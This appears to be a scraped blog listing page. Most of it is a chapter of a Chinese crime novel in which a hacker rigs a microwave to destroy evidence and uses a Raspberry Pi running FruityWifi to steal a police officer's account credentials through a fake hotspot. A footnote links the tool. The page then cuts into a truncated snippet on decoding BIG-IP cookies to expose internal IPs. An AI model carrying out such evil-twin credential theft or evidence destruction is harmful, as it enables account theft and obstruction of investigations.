&lt;p&gt;不知不觉，清晨的朝阳照亮了阳台，温暖而不炙热。随着最后一次回车键按响，程序也可以正常运行起来。就要离开这里了，收起桌上的两台笔记本电脑、U盘、望远镜、还有插在电脑上的树莓派装到背包里。将手机放到了微波炉里，并放在了电脑旁。王梓走出房子，电脑正常运行着。&lt;/p&gt;
&lt;p&gt;站在天台上，阳光照射全身，一股暖意袭遍王梓的全身。好难得的时光。可惜，马上就要走了。王梓找了快隐蔽的可以放进树莓派的地方，把树莓派放好，然后把太阳能天池板放到外面。可以为树莓派续航。&lt;/p&gt;
&lt;p&gt;王梓拿起了一部新手机，拨通了小楠的电话。响了三声，电话接通了。传来了带有起床气的一声喂，哪位？。&lt;/p&gt;
&lt;!-- more --&gt;
&lt;p&gt;“早上好啊～，我王梓。”。&lt;br&gt;
“这么早，你干什么呀？”&lt;br&gt;
“我就要离开这里了，一会的飞机，打电话跟你道个别。”&lt;br&gt;
“道别？你要去哪里啊？怎么也不提前打个招呼，怎么也要当面道别啊。”&lt;br&gt;
“我…… 我怕没有当面没有道别的勇气”&lt;br&gt;
“你呀，怎么说你好呢。那你要群里，以后有机会了，去找你玩啊。”&lt;br&gt;
“好，等我到了地方，发地址给你。你要记得按时吃早餐，注意身体。”&lt;br&gt;
“好～～”&lt;br&gt;
“记得，你欠我一顿饭了哦～千万不要忘记了哦”&lt;br&gt;
“嘿嘿～，忘不了。你接着睡吧。”&lt;br&gt;
“拜拜”&lt;br&gt;
“再见”&lt;/p&gt;
&lt;p&gt;小楠那边挂了电话，王梓说了一句：“后会无期”。脑海里浮现了那几句歌词：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;当一艘船沉入海底，当一个人成了谜
你不知道，他们为何离去
那声再见竟是他最后一句
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;旅游大把候车点&#34;&gt;旅游大把候车点&lt;/h2&gt;
&lt;p&gt;北京的早高峰即将到来，此刻，十几个人正在排队登上去往八达岭的旅游客车。王梓就在其中。王梓上车后，使用国外的网络电话给买家发了一条消息，两个小时后，八达岭长城景区景点见。一晚没睡，显得有些疲惫，可以趁车上的时间睡一会儿。&lt;/p&gt;
&lt;p&gt;到达地点后，王梓观察了下周围的环境。并寻找到了一处地点发给了对方，他则找了远处的一个地方，手持望远镜，等待这目标出现。约定的时间马上就要到了，有一个身穿牛仔裤，黑色夹克衫的中年男子出现了王梓视线内。王梓拨通了电话，那名男子拿起电话。确认了就是这个人。&lt;br&gt;
电话那头说：“我已经到了，你在哪里。”&lt;br&gt;
“进入景区，你找一个穿红色里面穿红色卫衣，头戴红色帽子，手拿红色导游旗子的就是我了。”&lt;br&gt;
“好，等我。”&lt;/p&gt;
&lt;p&gt;王梓观察这那名男子一举一动，王梓观察到周围有几个人也一直在跟着那个人。不久，他找到了王梓说的人，然后不知怎么起了一些争执，就要动手。此人看上去练过的样子。王梓觉得事情不好。关掉手机，往停车场走去。那个人自然联系不到王梓，他们只好给王梓留言。而王梓也开始了自己的逃亡之路。&lt;/p&gt;
&lt;p&gt;王梓家中来了警察，他们在门口按了几下门铃，等了一会，见没人应。便强制进入到王梓家中。进门的那一刻，一名警察似乎脚下被门口的什么东西拌了一下，接着传来清脆的风铃声。这时王梓的电脑主机开始运转速度加快，声音也随之变大。电脑中加密的内容开始被擦除。此时的王梓通过控制树莓派观看家里的影响和声音，他拍下了几个人的照片，然后按下了自毁按键。王梓家中电脑桌上的微波炉开始工作，警察们还在检查着屋子，就在即将来到电脑来来进行取证的时候。电脑桌上的微波炉爆炸了，还有火花，紧接着又爆炸一次。因为电脑就在微波炉旁边，电脑已经停止运转，而受爆炸影响，电脑的主板，硬盘等都已经损坏。而王梓家里的电也因为爆炸而跳闸。房间里静下来，爆炸的位置冒着烟。现在警察已经无法取证。只能继续排查房间，他们不知道的是，在检查房间的时候，一个警察的手机已经自动连接上了王梓伪造的wiki上。这个是通过在树莓派上搭建的FruityWifi（注解1）实现。王梓获取了这名警察的qq号码，和一个账号密码。并迅速擦除了树莓派上所有的记录。&lt;/p&gt;
&lt;p&gt;警察没有其他收获，最终仅仅带走了那个网络摄像头和已经损坏的电脑。&lt;/p&gt;
&lt;p&gt;王梓要冒险继续深入调查买家。他要了解清楚这一整件事。双方都在寻找王梓，但是一时间，王梓就如同人间蒸发，没有了踪迹。消息在网络中，隐藏在这现实世界中。&lt;/p&gt;
&lt;h2 id=&#34;注解&#34;&gt;注解&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;注解1: FruityWIfi是一款无线安全审计的开源工具，其灵感来自于Wifi Pineapple。开源地址：https://github.com/xtr4nge/FruityWifi 感兴趣的，可以搜索Wifi Pineapple和FruityWIfi去学习。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;（未完待续）&lt;/p&gt;
">原创小说《杀手》第十章 逃</a>
      </div>
      
      <div class="item">
        <a class="result-title" href="https://bacde.me/post/bigip-cookie-decode-get-real-ip/"" data-c="
          &lt;p&gt;BIGip是对负载均衡的实现，主要通过Virtual Server、iRules、Pool、Node、Monitor和Persistent（会话保持）实现。BIGip在实现会话保持机制时会在用户首次发起请求时，会为用户设置一个cookie，即服务端会添加set-cookie响应头头（比如：Set-Cookie: BIGipServer&lt;sub&gt;FinanceAndAdminWeb&lt;/sub&gt;fo.unc.edu=105389996.20480.0000 ）。后续的请求会判断并使用这个cookie值，服务端解码该cookie并使用服务器。&lt;/p&gt;
&lt;p&gt;最近发现一款工具，可以解BigIP的cookie，以此获取内网ip或者真实ip地址。这款工具名叫rabid，是ruby语
